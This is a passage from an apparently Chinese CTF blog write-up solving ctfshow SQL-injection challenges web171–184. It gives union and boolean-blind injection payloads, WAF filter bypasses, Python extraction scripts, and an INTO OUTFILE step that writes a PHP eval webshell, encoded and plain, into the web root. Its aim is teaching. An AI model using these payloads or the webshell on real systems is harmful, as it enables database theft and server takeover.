class="language-mysql">SELECT * FROM admin WHERE Username&#x3D;‘user’ and Password&#x3D;‘pass’ 万能密码：‘or ’1‘ &#x3D; ’1‘ # ;</code></pre><p>3.借助SQL注入漏洞提权获取系统权限;</p><p>4.读取文件信息。</p><h4 id="MYSQL数据库注入-常用函数："><a href="#MYSQL数据库注入-常用函数：" class="headerlink" title="MYSQL数据库注入-常用函数："></a>MYSQL数据库注入-常用函数：</h4><p>（1）user() 返回当前使用数据库的用户，也就是网站配置文件中连接数据库的账号 </p><p>（2）version() 返回当前数据库的版本 </p><p>（3）database() 返回当前使用的数据库，只有在use命令选择一个数据库之后，才能查到 </p><p>（4）group_concat() 把数据库中的某列数据或某几列数据合并为一个字符串 </p><p>（5）@@datadir 数据库路径 </p><p>（6）@@version_compile_os 操作系统版本</p><h4 id="SQL（联合）注入流程："><a href="#SQL（联合）注入流程：" class="headerlink" title="SQL（联合）注入流程："></a>SQL（联合）注入流程：</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">?id&#x3D;1 and 1&#x3D;1</code></pre><p>1、判断有无闭合 </p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">and 1&#x3D;1 and 1&#x3D;2 &#x2F;&#x2F;结果和第一个一样说明需要闭合，反之无闭合 有闭合则需要用到 --+闭合</code></pre><p>2、猜解字段</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">order by 10 &#x2F;&#x2F;采用二分法 </code></pre><p>3、判断数据回显位置 </p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">-1 union select 1，2，3，4，5.... &#x2F;&#x2F;参数等号后面加-表示不显示当前数据 </code></pre><p>4、获取当前数据库名、用户、版本 union select version(),database()，user()，4…… 4、获取全部数据库名</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">union select 1,2,(select group_concat(schema_name)from information_schema.schemata)</code></pre><p>5、获取表名</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">union select 1,2,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;库名&#39;</code></pre><p>6、获取字段名</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">union select 1,2,(select group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;表名&#39;</code></pre><p>7、获取数据</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">union select 1,2,(select group_concat(字段1，字段2)from 库名.表名</code></pre><p>函数名称： 函数功能：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">查 库： select schema_name from information_schema.schema查 表： select table_name from information_schema.tables where table_schema&#x3D;库名查 列： select column_name from information_schema.columns where table_name&#x3D;表名查数据： select 列名 from 库名.表名</code></pre><blockquote><p><a href="https://blog.csdn.net/fly_enum/article/details/135307756">SQL注入原理及思路绕过</a></p></blockquote><p>万能密码：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39; or 1&#x3D;1--+</code></pre><h4 id="mysql操作符优先级：（数字越大，优先级越高）"><a href="#mysql操作符优先级：（数字越大，优先级越高）" class="headerlink" title="mysql操作符优先级：（数字越大，优先级越高）"></a>mysql操作符优先级：（数字越大，优先级越高）</h4><p>优先级运算符<br>1:&#x3D;<br>2|| , OR , XOR<br>3&amp;&amp; , AND<br>4NOT<br>5BETWEEN, CASE, WHEN, THEN, ELSE<br>6&#x3D;, &lt;&#x3D;&gt;, &gt;&#x3D;, &gt;, &lt;&#x3D;, &lt;, &lt;&gt;, !&#x3D;, IS, LIKE, REGEXP, IN<br>7|<br>8&amp;<br>9&lt;&lt;, &gt;&gt;<br>10-, +<br>11*, &#x2F;, DIV, %, MOD<br>12^<br>13- (一元减号), ~ (一元比特反转)<br>14!<br>15BINARY, COLLATE</p><h4 id="总结–普通SQL注入必备条件："><a href="#总结–普通SQL注入必备条件：" class="headerlink" title="总结–普通SQL注入必备条件："></a>总结–普通SQL注入必备条件：</h4><p>1、界面能够回显数据库查询到的数据（必要条件）；</p><p>2、界面回显内容至少能够显示数据库中的某列数据（必要条件）；</p><p>3、部分能够直接提供数据库报错内容的回显；</p><h3 id="web171-253"><a href="#web171-253" class="headerlink" title="web171-253"></a>web171-253</h3><h4 id="web171-单引号闭合"><a href="#web171-单引号闭合" class="headerlink" title="web171(单引号闭合)"></a>web171(单引号闭合)</h4><p>查询语句</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">&#x2F;&#x2F;拼接sql语句查找指定ID用户$sql &#x3D; &quot;select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code></pre><p>根据流程拿到库 表 列名，最后拿到flag</p><p>第一题所以流程详细一点</p><p>首先尝试1’–+，发现有返回值；说明直接闭合正确；</p><p>接着找用来输出的列：<code>1&#39; order by 3--+</code>，发现一共有3行(就1,2,3,4,5慢慢试出来)</p><p>查看数据库：<code>1&#39; union select 1,2,database()--+</code>得到数据库名为<code>ctfshow_web</code></p><p>爆破表名：<code>-1&#39; union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schecma=database()--+</code>得到表名：<code>ctfshow_user</code></p><p>爆破列名：<code>1&#39; union select 1,2,group_concat(column_name) FROM information_schema.columns where table_schema=database() and table_name=&#39;ctfshow_user&#39;--+</code>，得到列名：<code>id,username,password</code></p><p>爆破信息：<code>1&#39; union select 1,2,group_concat(id,username,password) FROM ctfshow_user--+</code>，拿到flag。</p><p>整理一下：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">爆出有哪些位置可以进行输出数据1&#39; order by 3--+查看数据库名字1&#39; union select 1,2,database()--+爆破表名：-1&#39; union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schema&#x3D;database()--+爆破列名：1&#39; union select 1,2,group_concat(column_name) FROM information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;ctfshow_user&#39;--+爆破数据：1&#39; union select 1,2,group_concat(id,username,password) FROM ctfshow_user--+</code></pre><p>有一个问题就是，这里用的是1而不是-1，居然能够爆出信息。可能是这里没有限定输出数据的量，所以能够用1，而不是用-1。</p><h4 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h4><p>跟上一题差不多，只不过这里把flag换到另一个表<code>ctfshow_user2</code>里了，而且字段数改为2了</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">爆破表名-1&#39; union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schema&#x3D;database()--+爆破列名-1&#39; union select 1,2,group_concat(column_name) FROM information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;ctfshow_user2&#39;--+爆破flag-1&#39; union select 1,2,group_concat(password) FROM ctfshow_user2 where username&#x3D;&#39;flag&#39;--+</code></pre><h4 id="web173-回显检测"><a href="#web173-回显检测" class="headerlink" title="web173(回显检测)"></a>web173(回显检测)</h4><p>返回逻辑多了限制，回显不能有flag，但是直接查flag回显是ctfshow</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//检查结果是否有flag</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/i'</span><span class="token punctuation">,</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'查询成功'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">-1&#39; union select 1,2,password from ctfshow_user3 where username &#x3D; &#39;flag&#39; --+1&#39; union select 1,2,group_concat(&#39;+&#39;,password) from ctfshow_user3 where username&#x3D;&#39;flag&#39;--+</code></pre><p>或者使用其他绕过姿势  <strong>编码绕过,base64，hex</strong></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39; union select 1,2,to_base64(password) from ctfshow_user3 where username&#x3D;&#39;flag&#39;--+-1&#39; union select 1,to_base64(username),hex(password) from ctfshow_user3 --+</code></pre><h4 id="web174-replace"><a href="#web174-replace" class="headerlink" title="web174(replace)"></a>web174(replace)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//检查结果是否有flag</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag|[0-9]/i'</span><span class="token punctuation">,</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'查询成功'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>   </code></pre><p>限制了数字和<code>flag</code></p><p>替换：将数据to_base64加密，然后将里面所有的数字用replace()替换</p><p>替换方式：<code>1 @A</code>,<code>2 @B</code> <code>3 @C</code>等等</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">-1&#39; union select &#39;a&#39;,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),&quot;1&quot;,&quot;@A&quot;),&quot;2&quot;,&quot;@B&quot;),&quot;3&quot;,&quot;@C&quot;),&quot;4&quot;,&quot;@D&quot;),&quot;5&quot;,&quot;@E&quot;),&quot;6&quot;,&quot;@F&quot;),&quot;7&quot;,&quot;@G&quot;),&quot;8&quot;,&quot;@H&quot;),&quot;9&quot;,&quot;@I&quot;),&quot;0&quot;,&quot;@J&quot;) from ctfshow_user4 where username &#x3D; &#39;flag&#39; --+</code></pre><p>然后使用脚本解密得到flag</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64 flag64 <span class="token operator">=</span> <span class="token string">" "</span> flag <span class="token operator">=</span> flag64<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@A"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@B"</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@C"</span><span class="token punctuation">,</span> <span class="token string">"3"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@D"</span><span class="token punctuation">,</span> <span class="token string">"4"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@E"</span><span class="token punctuation">,</span> <span class="token string">"5"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@F"</span><span class="token punctuation">,</span> <span class="token string">"6"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@G"</span><span class="token punctuation">,</span> <span class="token string">"7"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@H"</span><span class="token punctuation">,</span> <span class="token string">"8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@I"</span><span class="token punctuation">,</span> <span class="token string">"9"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@J"</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h4 id="web175-into-outfile"><a href="#web175-into-outfile" class="headerlink" title="web175(into outfile)"></a>web175(into outfile)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//检查结果是否有flag</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\x00-\x7f]/i'</span><span class="token punctuation">,</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'查询成功'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>      </code></pre><p>过滤ASCII0-127的字符</p><p>1.将flag查询结果传入1.txt，访问url&#x2F;1.txt文件得flag</p><p>查询语句：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39; union select 1,password from ctfshow_user5 into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt&#39;--</code></pre><p>2.将一句话木马传入1.php，使用蚁剑链接后，访问数据库，查询flag</p><p>查询语句：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">99&#39; union select 1,&quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php</code></pre><p>burp-decoder—&gt;base64加密一句话木马，用url加密表示</p><p>payload:</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">99&#39; union select 1,from_base64(&quot;%50%44%39%77%61%48%41%67%5a%58%5a%68%62%43%67%6b%58%31%42%50%55%31%52%62%4d%56%30%70%4f%7a%38%2b&quot;) into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php</code></pre><h4 id="web176-大小写绕过"><a href="#web176-大小写绕过" class="headerlink" title="web176(大小写绕过)"></a>web176(大小写绕过)</h4><p>ban了select，使用大小写绕过</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39; union seLect 1,2,password from ctfshow_user--+</code></pre><h4 id="web177-绕过空格"><a href="#web177-绕过空格" class="headerlink" title="web177(&#x2F;**&#x2F;绕过空格)"></a>web177(&#x2F;**&#x2F;绕过空格)</h4><p>把空格给过滤掉了，就相当于把注释符– 给过滤掉了，我们可以用&#x2F;**&#x2F;或者是%0a（回车）来绕过空格的过滤，%23（#）来绕过注释符的过滤</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,group_concat(password)&#x2F;**&#x2F;from&#x2F;**&#x2F;ctfshow_user&#x2F;**&#x2F;where&#x2F;**&#x2F;username&#x3D;&#39;flag&#39;%23</code></pre><h4 id="web178-090a0b0c0d绕空格"><a href="#web178-090a0b0c0d绕空格" class="headerlink" title="web178(%090a0b0c0d绕空格*)"></a>web178(%090a0b0c0d绕空格*)</h4><p>因为已经过滤了<code>*</code>，那么就需要用其它字符来绕过空格，可以选择</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">%</span><span class="token number">09</span> tab<span class="token operator">%</span><span class="token number">0</span>a<span class="token operator">%</span><span class="token number">0</span>b<span class="token operator">%</span><span class="token number">0</span>c<span class="token operator">%</span><span class="token number">0</span>d </code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;union%09select%0a1,2,password%0bfrom%0cctfshow_user%23</code></pre><p>万能密码</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;or%0a1&#x3D;1%231’or&#39;1&#39;&#x3D;&#39;1&#39;%23</code></pre><h4 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h4><p>把<code>%09 %0a %0b %0d</code>过滤了，可以用<code>%0c</code></p><p>把上面的那个全换成<code>%0c</code></p><h4 id="web180-闭合绕过-23"><a href="#web180-闭合绕过-23" class="headerlink" title="web180(闭合绕过%23)"></a>web180(闭合绕过%23)</h4><p>过滤了空格和%23 ，空格可用<code>%0c</code>，%23用<code>or&#39;1&#39;=&#39;&#39;</code></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">-1&#39;%0cunion%0cselect%0c1,2,group_concat(password)%0cfrom%0cctfshow_user%0cwhere%0cusername&#x3D;&#39;flag&#39;or&#39;1&#39;&#x3D;&#39;</code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">-1&#39;%0cor%0cusername%0clike%0c&#39;flag</code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">&#39;or&#39;1&#39;&#x3D;&#39;1&#39;--%0c</code></pre><h4 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h4><p>同上</p><h4 id="web182-like模糊匹配"><a href="#web182-like模糊匹配" class="headerlink" title="web182(like模糊匹配)"></a>web182(like模糊匹配)</h4><p>增加了flag过滤。like可以模糊匹配，或者同上万能密码</p><p><code>%0c</code>在本题依旧可用。</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">-1&#39;||(username)like&#39;%fla%</code></pre><p>like可以用两个通配符（不区分大小写）：</p><table><thead><tr><th>字符</th><th>说明</th></tr></thead><tbody><tr><td><code>%</code></td><td>匹配任何数目的字符，甚至包括零字符</td></tr><tr><td><code>_</code></td><td>只能匹配一种字符</td></tr></tbody></table><h4 id="web183-布尔盲注"><a href="#web183-布尔盲注" class="headerlink" title="web183(布尔盲注)"></a>web183(布尔盲注)</h4><p>查询语句</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//拼接sql语句查找指定ID用户</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select count(pass) from "</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tableName'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">;</span>      </code></pre><p>返回逻辑</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//对传入的参数进行了过滤</span>  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>      </code></pre><p>查询结果</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//返回用户表的记录总数</span>      <span class="token variable">$user_count</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      </code></pre><p>waf又增加了一些，题目也有变化了。查询到的结果会返回到下面第三个灰块那里。</p><p>select不能用，就只能选择布尔盲注或者时间盲注了。</p><p>这题的解法是在已知表名的情况下实现的，再结合模糊匹配like或者正则匹配regexp。<br>写脚本前先测试一下语句是否能正常执行，可以的话，再写到脚本里。</p><p>因为每次查询记录总数都是1条，就是我们要找的flag，所以页面固定会出现$user_count &#x3D; 1;，可以用布尔盲注。</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">tableName&#x3D;&#96;ctfshow_user&#96;where&#96;pass&#96;like&#39;ctfshow&#123;%&#39;</code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">tableName&#x3D;&#96;ctfshow_user&#96;where(substr(&#96;pass&#96;,1,1)regexp(&#39;a&#39;))</code></pre><p>Payload：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">tableName&#x3D;&#96;ctfshow_user&#96;where&#96;pass&#96;like&#39;ctfshow&#123;%&#39;</code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">'https://b2eacc14-603c-45c4-bc2a-0ce02478cc81.challenge.ctf.show/select-waf.php'</span>flag <span class="token operator">=</span> <span class="token string">''</span>flagstr <span class="token operator">=</span> <span class="token string">"ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># (1, 46)</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"tableName"</span><span class="token punctuation">:</span> <span class="token string">"`ctfshow_user`where`pass`like\'ctfshow&#123;&#125;%\'"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag <span class="token operator">+</span> j<span class="token punctuation">)</span>            <span class="token comment"># 'tableName': f'`ctfshow_user`where(substr(`pass`,&#123;i&#125;,1)regexp('&#123;j&#125;'))'</span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token comment"># 有并发数量限制的题目，就睡一段时间</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$user_count = 1;"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            flag <span class="token operator">+=</span> j            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ctfshow"</span> <span class="token operator">+</span> flag<span class="token punctuation">)</span></code></pre><h4 id="web184-right-join-having"><a href="#web184-right-join-having" class="headerlink" title="web184(right join   having)"></a>web184(right join   having)</h4><p>返回逻辑</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//对传入的参数进行了过滤</span>  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><p><code>where</code>、<code>&#39; &quot;</code>、反引号被过滤了，但是本题没有过滤空格。</p><p><strong>方法一：（用right join绕过过滤）</strong></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">tableName&#x3D;&#96;ctfshow_user&#96; as a right join ctfshow_user as b on substr(b.pass,1,1)regexp(char(46))</code></pre><p>RIGHT JOIN 关键字从右表（table2）返回所有的行，即使左表（table1）中没有匹配。如果左表中没有匹配，则结果为 NULL。</p><p>[right join菜鸟教程](<a href="https://www.runoob.com/sql/sql-join-right.html">SQL RIGHT JOIN 关键字 | 菜鸟教程 (runoob.com)</a>)</p><p>这里是分别将ctfshow_uer重命名为a和b，接着在b中进行筛选，然后用<code>right join</code>将b中筛选出来的值与a表的值进行匹配。</p><p>这里用<code>$user_count = 43;</code>作为筛选条件。</p><p>Y4tacker师傅的代码</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># @Author:Y4tacker</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://214a3dd9-ba25-480b-bdc0-0f33a1c754d8.challenge.ctf.show/select-waf.php"</span>flag <span class="token operator">=</span> <span class="token string">'ctfshow&#123;'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token operator">&lt;=</span> <span class="token number">8</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"tableName"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)regexp(char(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">)))"</span></span>        <span class="token punctuation">&#125;</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$user_count = 43;"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">"."</span><span class="token punctuation">:</span>                flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"&#125;"</span><span class="token punctuation">:</span>                    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                <span class="token keyword">break</span></code></pre><p><strong>方法二：（where用having代替，’ “可以用 ()+Hex代替）</strong></p><p>查看官方文档，看看select语法。发现having和where可以替换，但是having语句有使用条件。</p><blockquote><p>一个HAVING子句必须位于GROUP BY子句之后，并位于ORDER BY子句之前。</p></blockquote><p><a href="https://www.runoob.com/sql/sql-having.html">SQL HAVING 子句</a></p><p><img src="web184.png" loading="lazy"></p><p><strong>十六进制</strong>：可以前面加x，后面用引号包裹或者0x；也可以和算数运算结合表示数字。</p><p><img src="web184_2.png" loading="lazy"></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">tableName&#x3D;ctfshow_user group by pass having pass like 0x63746673686f777b25  #ctfshow&#123;%</code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl<span class="token operator">=</span><span class="token string">"http://24873af7-39c6-4235-85e2-f6433b80f182.challenge.ctf.show/select-waf.php"</span>flagstr<span class="token operator">=</span><span class="token string">"ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_"</span>   <span class="token comment">#40</span>flag<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>        data<span class="token operator">=</span><span class="token punctuation">&#123;</span>            <span class="token string">"tableName"</span><span class="token punctuation">:</span><span class="token string">"ctfshow_user group by pass having pass like 0x63746673686f777b&#123;&#125;25"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token operator">+</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">#print(data)</span>        response<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token comment">#有并发数量限制的，就睡一段时间</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$user_count = 1;"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>            flag<span class="token operator">+=</span>x            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ctfshow&#123;"</span><span class="token 